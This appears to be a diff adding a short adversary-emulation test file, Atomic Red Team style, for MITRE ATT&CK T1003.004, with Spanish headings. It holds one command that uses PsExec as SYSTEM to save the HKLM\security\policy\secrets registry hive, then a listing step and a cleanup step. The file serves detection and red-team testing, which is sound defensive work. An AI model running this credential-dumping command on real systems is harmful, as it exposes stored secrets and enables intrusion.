@@ -1,0 +1,13 @@
+################T1003.004.md################
+
+##Atomic Test #1 - Dumping LSA Secrets
+
+```md evidencia_T1003-004```
+```PSTools\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets evidencia_T1003-004\secrets /y```
+
+##Evidencia
+```dir evidencia_T1003-004```
+
+#Borrado
+```del evidencia_T1003-004\secrets >nul 2> nul```
+```PAUSE```
